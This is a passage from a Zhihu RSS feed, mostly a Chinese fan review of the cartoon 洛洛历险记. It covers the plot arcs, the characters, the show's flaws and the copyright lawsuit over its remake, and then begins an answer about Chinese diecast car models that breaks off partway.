data-original-src=\"v2-3d3d3b6a48d97c626a0aba34551a6cce\" data-watermark-src=\"v2-24868463521e1c791e687c9a2633572b\" data-private-watermark-src=\"v2-2213119af61c3cbe2effe5e917d9715d\"></p>\n<p>猛虎王的强大，这是众所周知的事实，而为了让机车族拥有打败其能力的信心，猛虎王通过一次次攻城挑战来麻痹众人，一次次地败退，让他们产生可以战胜猛虎王的想法，助长其骄兵气息。最后能源之城选择出击，却以惨败回归。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-91122350f0efcb3576013f0012d0f22f_720w.jpg?rss\" data-rawwidth=\"823\" data-rawheight=\"613\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-91122350f0efcb3576013f0012d0f22f\" data-watermark-src=\"v2-7f3d75f51665cf55ef750929ccd9cd55\" data-private-watermark-src=\"v2-97fe686ab9b3e72f6b6d9a592a0d8c04\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ed0b9457227bda2e6f2a764698f867ef_720w.jpg?rss\" data-rawwidth=\"824\" data-rawheight=\"608\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-ed0b9457227bda2e6f2a764698f867ef\" data-watermark-src=\"v2-2f9d79a931e6af12aa6239259f0a0760\" data-private-watermark-src=\"v2-4138b79cc068b39a2d000f0e02ef1c58\"></p>\n<p>待攻占能源之城后，这也仅仅只是个开始。</p>\n<p>洛洛、闪电（城主）、霹雳火以及急先锋掉入火龙山谷，在此练习流影电光闪。</p>\n<p>而风火轮、龙卷风和力霸天则前往圣骑森林，一是为力霸天接回其断臂，二是寻找冲击波。</p>\n<p>之后狂野猩出来攻打猛虎王，金铁兽牺牲来救狂野猩。</p>\n<p>蓝毒兽背叛猛虎王，暴龙神来摘取胜利的果实，闪电战死，力霸天出手营救猛虎王，最后猛虎王掉下火龙山谷为这一篇章画上句号。</p>\n<p><br></p>\n<p>除此外，我对这个篇章映像深刻的一点就是，当初我家里有碟片机，当初看这部动画的方式是用光盘来看。而那时家里的电视机有一个臭毛病。</p>\n<p>即DVD播放到一定时间段时，就会蓝屏，即再也观看不下去。我也不知道这是何毛病。而恰好，每次看到能源之城攻防战的时候，就卡在那里。</p>\n<p>之后的剧情就再也看不到了，所以我一直很发疯，明明后续就在眼前，却无法观看，想起来就难受。</p>\n<p><b>最终战</b></p>\n<p>除了能源之城篇，最终战篇我也觉得可以具体展开讲讲。</p>\n<p>战前，机车族练成了合击了绝技，准备将猛兽族分而击之。</p>\n<p>不过，在后半段方才出现的猛兽族机战王晶晶改变了这一切，让本来可以较为顺利进行的计划蒙上一层阴影。</p>\n<p>暴龙神先来到狂野之城，明面上围魏救赵，实则是狂野猩调到亡灵之都。而猛虎王则选择放弃攻打雷霆殿，回到狂野之城，然后暴龙神再前往雷霆殿。至此，克制关系已经完全反了过来。</p>\n<p>按照其计划，猛兽族可以一举赢下机车族。</p>\n<p>不过，晶晶算漏了三点，</p>\n<p>第一点是忽视棋子自身情感，这一点在前文提到过，在此不再赘述。</p>\n<p>第二点就是蓝毒兽的存在，蓝毒兽拥有雷霆殿令牌，并将计划泄露给风火轮，最后让洛洛从亡灵之都逃出来，最后才得以让霹雳火与急先锋活下来。</p>\n<p>第三点则是留给霹雳火和急先锋的挂，月色。</p>\n<p>第一点导致前往狂野之城与亡灵之都的机车族没有死，全部聚集在雷霆殿当中。</p>\n<p>第二点导致整个计划被打乱。</p>\n<p>第三点则是导致没有霹雳火与急先锋没有被暴龙神杀死。</p>\n<p>机车族和猛兽族几乎全员到场，并且已经开战。</p>\n<p>二者也进入一个随时有可能你死我活的状态。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-04376315a18133734f286bc1d098124a_720w.jpg?rss\" data-rawwidth=\"1435\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-04376315a18133734f286bc1d098124a\" data-watermark-src=\"v2-29d27001bdad5b8cd728f12e23e1cb54\" data-private-watermark-src=\"v2-98f107dd167eed75a0cd870fab7d3c3c\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-be2264957612adb83afaccad62e76617_720w.jpg?rss\" data-rawwidth=\"751\" data-rawheight=\"570\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-be2264957612adb83afaccad62e76617\" data-watermark-src=\"v2-81700ed9396c8ffa94c86268a81443fe\" data-private-watermark-src=\"v2-bd87a70d47667a141a3b14012d83b857\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-e5661a52df66910b65921410d74ab897_720w.jpg?rss\" data-rawwidth=\"744\" data-rawheight=\"571\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e5661a52df66910b65921410d74ab897\" data-watermark-src=\"v2-0db1fdf341750e755ec17ed2b4958d70\" data-private-watermark-src=\"v2-b826d58768d8a63caa434060c571c779\"></p>\n<p>最后以一种较为巧妙的方式解决了整个矛盾，即谈一谈。</p>\n<p>谈一谈，有时候真的可以解决问题。</p>\n<p>洛洛和晶晶都想回家，都需要对方的令牌，于是二者便选择合作，这样都可以一起回家了。</p>\n<p>这样机战王即不存在根本矛盾了，所以二者可以和平解决。</p>\n<p>可是，并未解决机车族和猛兽族的矛盾。</p>\n<p><br></p>\n<p>一个标准的王道少年动画剧本。</p>\n<p>情节能做到曲折而易懂，人物没有降智，亦未感受到相应降智，人物各种背叛与情感，以及即使是反派角色，亦有情有义。这种剧情，国内与之相似的有同样是国产动画的经典之作《虹猫蓝兔七侠传》。</p>\n<p><b>人物饱满</b></p>\n<p>《洛洛历险记》让人最为称道的是角色刻画，除了主角方机车族的刻画，反派方面的刻画亦不曾减少。</p>\n<p>无论是机车族，又或者是猛兽族，还是机战王，他们都会成长，都会改变。</p>\n<p><b>猛虎王</b>，他有一句经典的话，“<b>战争是一场肮脏的游戏，而我是一个肮脏的玩家</b>”。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-e84dce5c6c74be0037605180602f44d2_720w.jpg?rss\" data-rawwidth=\"755\" data-rawheight=\"562\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e84dce5c6c74be0037605180602f44d2\" data-watermark-src=\"v2-b2c644223a313dbcdc420defdf0d36f6\" data-private-watermark-src=\"v2-3727b1565dc2ec272d0c33e53b325a69\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-e661a45668e9ad49cdba5bc2c4a2dd4e_720w.jpg?rss\" data-rawwidth=\"670\" data-rawheight=\"507\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-e661a45668e9ad49cdba5bc2c4a2dd4e\" data-watermark-src=\"v2-d33d16e98e8986957dd7071b0008a88a\" data-private-watermark-src=\"v2-d022a9af5b9e17e82bc23084c8718247\"></p>\n<p>猛虎王诡计多端，利用一切可以利用。以前他和狂野猩是朋友，后来为了利益可以三番五次算计狂野猩。他又极度讨厌叛徒，银铁兽背叛了狂野猩却被他转手杀死。</p>\n<p>不过当他开始频繁利用别人时，也许没有想到有面终有一天，自己也会被蓝毒兽背叛，亦绝不会想到，出来救他的是一自己暗算过多次的对手——力霸天。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-64384cf0c4b7cdc764a4186096dbbc5a_720w.jpg?rss\" data-rawwidth=\"754\" data-rawheight=\"554\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-64384cf0c4b7cdc764a4186096dbbc5a\" data-watermark-src=\"v2-a5f773e1eba5edee0f1d6d6ae24dfc4b\" data-private-watermark-src=\"v2-92cf2f0ef6097e71b4460dc8a2dd9b34\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-dd3aa325559dc39ebc9a816946913229_720w.jpg?rss\" data-rawwidth=\"743\" data-rawheight=\"562\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-dd3aa325559dc39ebc9a816946913229\" data-watermark-src=\"v2-083ca464b93e206e5f13ac6627cee8a3\" data-private-watermark-src=\"v2-260815ac4267ad72ed8d1bb24253dec5\"></p>\n<p>同样，猛虎王也想不到，当他向狂野猩借兵时，这个曾被他杀死过手下第一大将、多次暗算过狂野猩，可以借给他黑铁兽大军。并且狂野猩也没有要猛虎王的后备隐藏能源。</p>\n<p>猛虎王一直以来秉持想法，被现实一点点改变。</p>\n<p>所以他后来说出了“最珍贵的是朋友”这句话。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-80c0fe0865b1a63f2949ab649f1c2675_720w.jpg?rss\" data-rawwidth=\"749\" data-rawheight=\"567\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-80c0fe0865b1a63f2949ab649f1c2675\" data-watermark-src=\"v2-17204e7b2da13e499d5cf4ede725503b\" data-private-watermark-src=\"v2-e0071396e5c87216e730461892a9b6e9\"></p>\n<p>也是如此，最后才会放过力霸天和冲击波。</p>\n<p><br></p>\n<p><b>狂野猩</b>，一个迷信自己拳头的傻大个，以为自己在失去金铁兽后，便不再迷信自己的力量。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7791a008833b5525d7c5b1f9ec5d1a79_720w.jpg?rss\" data-rawwidth=\"749\" data-rawheight=\"785\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7791a008833b5525d7c5b1f9ec5d1a79\" data-watermark-src=\"v2-3edad96cbecf43d95e67f03255bbf5c8\" data-private-watermark-src=\"v2-69eebe8e216089374e741d3f01354999\"></p>\n<p>说起狂野猩，就不得不起金铁兽，金铁兽是在观众中人气很高，有勇有谋，忠心耿耿，多次救主，最后为了救出狂野猩，使用其后备隐藏能源，战死于沙场。</p>\n<p>金铁兽遇到了其伯乐，为狂野猩战死沙场也许是其最好的归宿。</p>\n<p>正所谓，士为知之者死。</p>\n<p><br></p>\n<p><b>暴龙神</b>，出场较晚，刻画亦比较少，一个典型的阴谋家，最后在能源之城篇后坐收渔人之利。可惜很快就被新猛兽族的机战王所控制，其个人想法并无太大展现，导致其并无太多刻画，可以说是挺可惜的。</p>\n<p><br></p>\n<p><b>霹雳火&amp;急先锋</b></p>\n<p>霹雳火，怜悯心太重，是其师父对霹雳火的评价。我认为他有一种精神，其名为博爱。在这个弱肉强食的世界里，尤为难得。</p>\n<p>强者才能生存的世界，还有情感存在。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fd2e9633eb52b614382366e06541de99_720w.jpg?rss\" data-rawwidth=\"746\" data-rawheight=\"901\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-fd2e9633eb52b614382366e06541de99\" data-watermark-src=\"v2-aacf10cd730c6a6491e1ea16b7934393\" data-private-watermark-src=\"v2-19411593ce7f11588aaebf617c8f95f6\"></p>\n<p><br></p>\n<p>在后期，所有以强者为尊的角色，都或多或少因为情感而改变了观念，猛虎王、急先锋、龙卷风、狂野猩等等。</p>\n<p>除此之外，霹雳火还是洛洛的引路人。洛洛是游戏高手，却也无法理解这些事，毕竟也只是小毛孩。一切以自身利益至上的洛洛，也被霹雳火逐渐改变了其观念。</p>\n<p>全剧中，最少改变的就是他了。</p>\n<p>急先锋，名如其人，技能也亦如其人。一切都很急，亦很自大。</p>\n<p>然后被更强大的猛虎王所教育，便一蹶不振，其师父因此而死，月神殿亦因此而毁灭。</p>\n<p>之后，其心态亦改变很多，待到机战王洛洛来到后，方才重新找回其信念。</p>\n<p>一急一缓，组成一对，方能使其合击绝技“流影电光闪”。</p>\n<p><b>力霸天&amp;冲击波</b></p>\n<p>力霸天是典型的力量型选手，其性格亦是如此——稳重。</p>\n<p>本来是与世无争的一个推土机，但是其弟弟被蓝豹兽所杀之后，方才选择与霹雳火等人联手。</p>\n<p>路见不平，亦会拔刀相助，尊重一个战士，战士可以战死，但绝不能侮辱至死。</p>\n<p>冲击波，也是类似，只不过领地意识相对更强些见不贯欺负弱小之辈。</p>\n<p><b>龙卷风&amp;超音速</b></p>\n<p>龙卷风，据我观察，这是人气最高的机器人。</p>\n<p>首先是有个性。</p>\n<p>其次是帅，直升机与其它机器人相比，无论是其直升机形态还是其人形态，都是最好看的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-9286a1dd7533faa0aa7e7997dc14f04d_720w.jpg?rss\" data-rawwidth=\"1432\" data-rawheight=\"1079\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-9286a1dd7533faa0aa7e7997dc14f04d\" data-watermark-src=\"v2-86cbe6eb986cc0b236ce95eec6b3fc44\" data-private-watermark-src=\"v2-e82b4f2162e1dd2f01fd4892f8e832ac\"></p>\n<p>这种有点痞痞的性格，再加上其强大的实力与其好看的机器身，人气高方才正常。</p>\n<p>其师父死（机车族人均死师父）后，其性格也越来越稳重。</p>\n<p>超音速，风雪之城城主，机车族第一高手。一开始因为师父风雪，而导致与其不和。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5a2400e5549075713476948af5e473be_720w.jpg?rss\" data-rawwidth=\"1433\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-5a2400e5549075713476948af5e473be\" data-watermark-src=\"v2-30d06b5e80bba1ca17c1a429fc7a2126\" data-private-watermark-src=\"v2-1b7b5f41a974341c89b64d27e3f29649\"></p>\n<p>不过暴龙神的到来，反倒帮其来解决这多年以来未曾解决掉一段恩怨，一段闪电与风雪多年前的恩怨。</p>\n<p><b>洛洛</b></p>\n<p>一个无意间闯入游戏世界的小孩，亦是一个爱玩游戏的小孩。来到异世界后，会有想家的情绪，也会迷茫，不过在一步步地成长。</p>\n<p>他会为了自己输给女生而生气，会有好胜心。</p>\n<p>一开始他无法理解霹雳火等所做所为，不明白何为“大丈夫有所不为，有所必为”。</p>\n<p>后来看到金铁兽救了自己的时候，我想洛洛在那里就知道了何为</p>\n<p>不过渐渐地接受了自己机战王的身份，并担起了机战王的责任。</p>\n<p>但机战王到底是怎么样的，谁也不知道，只能靠猜，大家说洛洛是就是。</p>\n<blockquote>洛洛：我实在也不是谦虚，我一个小孩子，怎么就当上了机战王呢。</blockquote>\n<p><br></p>\n<p><b>蓝毒兽</b></p>\n<blockquote>战争是一场肮脏的游戏，而我是更肮脏的玩家。</blockquote>\n<p>一个绝对的利己主义者，本剧最成功的反派，无论是剧中还是剧外。</p>\n<p>阴枭，从其名字形象到其技能，无一透露着一股冷冰冰的感觉.</p>\n<p><img src=\"https://pic3.zhimg.com/v2-0d88d9d7dba4aa9b1118213250fec655_720w.jpg?rss\" data-rawwidth=\"745\" data-rawheight=\"555\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-0d88d9d7dba4aa9b1118213250fec655\" data-watermark-src=\"v2-8fc91463e47b62e24e8986ec4c03353d\" data-private-watermark-src=\"v2-04a1c8ae4c838bec6fd5153f7c92500d\"></p>\n<p>小个子而又类似于一种蚁兽的外形，与其他机器人有一股截然不同的感觉，其名字与其手下名字紫毒兽，都透着一股奇怪的气息。</p>\n<p>幽冥音波功，这个技能是一个声音攻击，中招者会使自身能力下降。</p>\n<p>每次在屏幕上看到他，都会感觉到很危险。</p>\n<p>在能源之城离间闪电和风雪，让其兄弟反目成仇，虽然自己的部族也被灭了。</p>\n<p>投奔暴龙神，暴龙神便将其安插在猛虎王那里，猛虎王也心知蓝毒兽另有所图，但还是选择留下他，因为这样可以利用他。</p>\n<p>可惜最后还是被蓝毒兽反利用了。</p>\n<p>大决战前抢下时光之城的令牌，以令牌胁迫两个机战王下约定，约定永不侵犯蓝毒兽。</p>\n<p>一般这种小人，在其他少儿动画中，少年动画里，最后的结局都不会好，不是死也会是一种较为惨淡的结局，譬如发疯、脑残。但是《洛洛》里竟然让其逍遥法外，这是我没想到的，也许当年在电视机前看动画的人也没有几个人能想到。</p>\n<p><b>其它优点</b></p>\n<p>合体技能的设计很好，单打独斗斗不过，但是使用其合体技便能赢下。并且有相对应的克制关系，更为奇妙的是，机车族这一方一个合体技能克制猛兽族一方，而猛兽族这一方换一个对象即可打败机车族。如猛虎王对冲击波&amp;力霸天。</p>\n<p>除此之外，就是很帅，合体技能的动画很帅。</p>\n<p>除此之外，还有一招特殊的合体技——月色血风暴。</p>\n<p>最后月色血风暴的那招，真的是挺让年幼的我挺激动的。</p>\n<p>洛洛被逼入绝境，最后依照月亮的力量，使出最后的绝招“月色血风暴”，虽然仍是无特殊效果，不过在其剧情、背景音乐的角度下显得尤为激动人心。</p>\n<p>现在想想，月光即为HP这个挂还是过于强了，即使这个挂是有伏笔的，霹雳火和急先锋身上都一堆月亮元素，月神殿、时光之城、雷霆半月斩等等，还在霹雳火在第一次月光之下使出其雷霆半月斩。</p>\n<p><b>缺点</b></p>\n<p>整个世界都很奇怪，</p>\n<p>比如机器人是如何生产出来的？剧中没有解释。</p>\n<p>为何在机器人的世界里，洛洛一个碳基生物在这里却没有人感到奇怪。</p>\n<p>机器人是靠什么补充能量的？源源不断的能量是从何而来？</p>\n<p>风火轮一个机器人怎么会开一些私生子的玩笑？</p>\n<p>洛洛怎么从不会感到饥饿？</p>\n<p>……</p>\n<p>但是又不是很奇怪，因为这个世界的产生就很不正常，是人为制造出来的。</p>\n<p>一切都是由程序算法而做成的。</p>\n<p>还是得说下其它缺点，这部动画的缺点还是挺多的，很大一部分是源于钱，另一方面可以说是由于经验不足。</p>\n<p>最直观的是打斗画面，这是蓝弧第一部真正意义上的打斗动画，其动作设计约等于没有。都是简单走走走，放技能，而后在比力气。</p>\n<p>兼用卡太多，不过这个在后期改善了很多，前几集里，黑铁兽大军的那段，真的是一个接一个来重复。</p>\n<p>还有就是少儿作品的通病了吧，动画技能的变身过多，但是不变身的话总感觉缺了什么，因为本来就没什么好的动作设计，并且其技能特效也约等于没有，大多时候就在那时比力气……</p>\n<p>除此之外，一些情节，不得不降智。譬如《引蛇出洞》这一集，猛虎王刚受了伤，又明白急先锋不可能是只有一个人，并且他们很有可能练成了“流影电光闪”，如此草率追出去，明显地给猛虎王降智了。</p>\n<h3>重制</h3>\n<p>开头方面，由一个网瘾少年更改为一个电竞少年，缺乏了代入感以及共鸣感。</p>\n<p>《洛洛历险记》在当初能火，很大程度是因为同是相对普通的少年，利用现实世界中的游戏知识，在游戏世界里一步步成长，带领相对较弱的机车族一步步地能与其抗衡。</p>\n<p>在此期间，这部动画带了一个其名为爽感的情绪。</p>\n<p>而阵子看了一个问题“如何看待穿越小说中，一个普通人穿越后智商爆表，完爆几十岁的老狐狸？”， 下面 <a class=\"member_mention\" href=\"http://www.zhihu.com/people/47ec72b16d39036ae7817992f4be8c4c\" data-hash=\"47ec72b16d39036ae7817992f4be8c4c\" data-hovercard=\"p$b$47ec72b16d39036ae7817992f4be8c4c\">@三叔侃侃</a> 的回答中指出两点爽文特征</p>\n<blockquote>\n<b>一、主人公起点不能过于夸张，否则缺乏代入感。</b><br><b>二、主人公必须在剧情过程中不断开启金手指和上帝视角，从而实现常人所不能。</b><sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"3\" data-text=\"\" data-url=\"https://www.zhihu.com/question/376857581/answer/1834736238\">[3]</sup>\n</blockquote>\n<p>照此来看，洛洛历险记亦是一标准的穿越型小说，不过十岁的小毛孩可以与活了几百年的猛虎族斗智斗勇。</p>\n<p>不过，这不正是我当初喜欢《洛洛》的原因吗。</p>\n<h3>后续</h3>\n<p>《百变机兽之洛洛历险记》，从其名字可以看出，百变机兽肯定不止这么一部作品。是的，百变机兽是一个系列，并且除了《洛洛历险记》外，还有一系列后续作品。</p>\n<p>譬如《神龙拯救队之元气星魂》</p>\n<p><img src=\"https://pic2.zhimg.com/v2-14a89ea824b03746dde38108ad98d647_720w.jpg?rss\" data-rawwidth=\"1601\" data-rawheight=\"1000\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-14a89ea824b03746dde38108ad98d647\" data-watermark-src=\"v2-248f6a0dee55cfef743e6c291078fc52\" data-private-watermark-src=\"v2-9526e133967ec51c84d19fe83ea89545\"></p>\n<p>《霹雳勇士之元气勇者》</p>\n<p><img src=\"https://pic3.zhimg.com/v2-67e04965964c8823d94f368d1e82cd6c_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-67e04965964c8823d94f368d1e82cd6c\" data-watermark-src=\"v2-d884db7aad409a2bf1404f52fe49a591\" data-private-watermark-src=\"v2-80ff6665f0cf06b41dbcc3cd2124cdc1\"></p>\n<p>以及《元气拯救队》</p>\n<p><img src=\"https://pic2.zhimg.com/v2-1670333acb6e687a8cae3fcd6854c111_720w.jpg?rss\" data-rawwidth=\"695\" data-rawheight=\"817\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-1670333acb6e687a8cae3fcd6854c111\" data-watermark-src=\"v2-3b082e57819708e96a588a935c40504c\" data-private-watermark-src=\"v2-06a971ec71c74565467ef5057f09b277\"></p>\n<p>从其机器人外表来看，这三部都是百变机兽的系列作品，只不过世界观和制作公司与《洛洛》完全无关。</p>\n<p>这三部动画的制作均由星杰和湖南金鹰联合出品，星原进行制作的作品。</p>\n<p>至于为何不与蓝弧合作，我不清楚其内幕。明明二者的合作是属于互相成就，推测是二者对于版本的归属有了争议。</p>\n<p>以至于后来蓝弧和奥飞联合制作了重制版动画《武战道》，不过却被星杰告上法庭，最后于2018年宣判。</p>\n<blockquote>2018年4月20日，法院作出一审判决，认定《武战道》侵犯该剧著作权人的权利，酌情判令三被告（蓝弧动漫、蓝弧文化、奥飞）共同向该剧权利人王巍支付著作权使用费120万元。<sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"4\" data-text=\"\" data-url=\"https://baike.baidu.com/reference/8103125/4bec-P9AbeZ0Vakwoerm9kZcAnShQO88WNAJJ_hMYx2FbfGvAbZDfnTREgcVzsavmFPOUucErSwFQSF5hm3LIzm5Buw\">[4]</sup>\n</blockquote>\n<p>一个剧本拍出两部动画，谁侵权？</p>\n<p>我不大熟悉法律，将其判决放在此处，读者可自行评判。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-86159e9d9bbaa04ac951438852742417_720w.jpg?rss\" data-rawwidth=\"841\" data-rawheight=\"827\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-86159e9d9bbaa04ac951438852742417\" data-watermark-src=\"v2-1732b4298895f0d7c47608c6b48bcbc8\" data-private-watermark-src=\"v2-c75e88bac0dd4f2f978b31506a154c77\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-b3edd5ce4627d8c861acde3af7131173_720w.jpg?rss\" data-rawwidth=\"866\" data-rawheight=\"826\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-b3edd5ce4627d8c861acde3af7131173\" data-watermark-src=\"v2-6ae0e596892aa85d7d1357d0ef569d84\" data-private-watermark-src=\"v2-f341d3e7c0bf48e47f46ec2c11929a37\"></p>\n<p><sup data-draft-node=\"inline\" data-draft-type=\"reference\" data-numero=\"5\" data-text=\"一个剧本拍出两部动画，谁侵权？\" data-url=\"https://gd.qq.com/a/20180419/029886.htm\">[5]</sup></p>\n<p>我对这个版权归属争议的看法很简单，即是遗憾。</p>\n<p>若是星杰仍继续与蓝弧合作，其后续至少比上述这些动画更有看头。</p>\n<p>可以出前传，前一任机战王的经历；亦可以出后续，最后机车族与猛兽族还是打了起来，因为最后仅仅只是洛洛和晶晶的矛盾解决，而机车族与猛兽族的根本矛盾从未解决，其根本矛盾即程序设计开始，便植入其根中的战斗设计。</p>\n<p>回到现实世界中，洛洛和晶晶仍在互相对战，一切又似乎回到了原点。</p>\n<p>但一切都在在2009年戛然而止，《洛洛历险记》最终还是没有其后续之作。</p>\n<h3>结语</h3>\n<p>其作品本身而言，一部有缺点，但是剧情优秀，人物刻画饱满的作品。</p>\n<p>一部奠定蓝弧风格的作品，自此，蓝弧完成了从制作日常动画变成了制作机甲动画的转换。</p>\n<p>也因这部动画而迈向其巅峰期，不过，五年后重制版折戟，使得蓝弧不得不再寻找转型之路。</p>\n<p>若仅仅也是折戟，亦还可接受，动画总会有成败，此时（2014）的蓝弧不再是五年前的小公司，此时已经拥有一定的经济实力，亦有相对应的抗压能力。此事带来其后果是，与星杰翻脸，并开始了官司之路。</p>\n<p>蓝弧此时可能未曾想到，它所面临的版权问题，仅仅只是开始。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-dac1ca748f8731f819837af7b4b3ca8e_720w.jpg?rss\" data-rawwidth=\"746\" data-rawheight=\"558\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-dac1ca748f8731f819837af7b4b3ca8e\" data-watermark-src=\"v2-b811c8b29f1413a2166c088d58a0530c\" data-private-watermark-src=\"v2-3c676be8309847a08e5f970f95ecdb4b\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jinl1874?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">道理</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/63320560/answer/1891698659?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">27 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/29003517?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价天元突破里的人物？</a><br><a href=\"http://www.zhihu.com/question/272101362?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">那些动画形象贯穿你的童年？</a><br>\n","link":"http://www.zhihu.com/question/63320560/answer/1891698659?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"中国的模型玩具制造水平达到了什么程度？","date":"2021-07-04 15:30:08","description":"\n<p>说说静态汽车模型吧，简直就是逆袭的典范。</p>\n<p>如果在 10 年前，国产汽车模型还是入门和低端的代名词。那个时候市面上主流的模型，诸如 AutoArt、京商、minichamps，1:18 模型在 500-1000 元的主流价位，1:43 模型在 100-300 左右的价位，做出了非常多经典的汽车模型，形态准确，细节丰富，可玩性也很出色。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-7c11c70ad196a980bcfdee470c581725_720w.jpg?rss\" data-rawwidth=\"1280\" data-rawheight=\"852\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-7c11c70ad196a980bcfdee470c581725\" data-watermark-src=\"v2-c8ec50de56be8017abd80e78642eec95\" data-private-watermark-src=\"v2-04a4c476ea895ec860d37592fe13e2a1\"></p>\n<p>比如图上这四台 1:43 的小比例模型，左1和右1是 AutoArt 全盛时期的作品，在不到 10cm 的小尺寸上实现了前轮转向，逼真的车灯细节。在 1:18 的大尺寸上，则有全部车门可开，方向盘车轮转件，内饰和后备箱植绒、独立的安全带扣甚至可动的后排中央扶手箱等等等丰富的细节。更是创造了无数如今难以企及的海景房车型，比如 AutoArt 的奔驰系列：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-83c2e969cf8846da4ed100f43ecad1b6_720w.jpg?rss\" data-rawwidth=\"580\" data-rawheight=\"435\" data-size=\"normal\" data-caption=\"贴吧拿图，原作者：凌云壮志，侵删（这台是原厂版，仅前门能开）\" data-watermark=\"original\" data-original-src=\"v2-83c2e969cf8846da4ed100f43ecad1b6\" data-watermark-src=\"v2-17bc7df3ef0714be36b5121ac85e72d8\" data-private-watermark-src=\"v2-71723eb9500af1ec657a40ef866a8cdf\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-3735704804765db5889039ec0f303b30_720w.jpg?rss\" data-rawwidth=\"580\" data-rawheight=\"435\" data-size=\"normal\" data-caption=\"贴吧拿图，奔驰 280SE，原作者：Chelly，侵删\" data-watermark=\"original\" data-original-src=\"v2-3735704804765db5889039ec0f303b30\" data-watermark-src=\"v2-8645fdde68aaf78442e6c74ab8818ccd\" data-private-watermark-src=\"v2-42e683ed921ba4ff5c7815d543deac30\"></p>\n<p>如果你对以上产品没有什么概念，那我们一起看下同时代的国产模型翘楚，威力 Welly，产品在在 200-300 价位的 1:18 模型，是这样的： </p>\n<p><img src=\"https://pic2.zhimg.com/v2-23bfbf4ec5ede674b17714c5a5a2abd9_720w.jpg?rss\" data-rawwidth=\"800\" data-rawheight=\"800\" data-size=\"normal\" data-caption=\"\" data-watermark=\"original\" data-original-src=\"v2-23bfbf4ec5ede674b17714c5a5a2abd9\" data-watermark-src=\"v2-3e32084170a3a69f736c32875fc2ff63\" data-private-watermark-src=\"v2-378e2378e1e73e30ff2f8c8fc217b27d\"></p>\n<p>虽然已经有了相当不错的型准，但是整体做工相当粗糙，比如粗大且质感低劣的镀铬件，大灯中黑色的固定点，也就是传说中的死鱼眼，还有较弱的可玩性，这款大众 T1 似乎只有 2-3 个门可以开，而相近的舒克的模型，是这样的：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-692cc8ff0f6ef8179ca940d131f32359_720w.jpg?rss\" data-rawwidth=\"1200\" data-rawheight=\"1200\" data-size=\"normal\" data-caption=\"舒克的 T1，变态的全开展示，客运版甚至还有布艺的可动顶棚，图源：东西皇朝，已经好久没有听过这家店了\" data-watermark=\"original\" data-original-src=\"v2-692cc8ff0f6ef8179ca940d131f32359\" 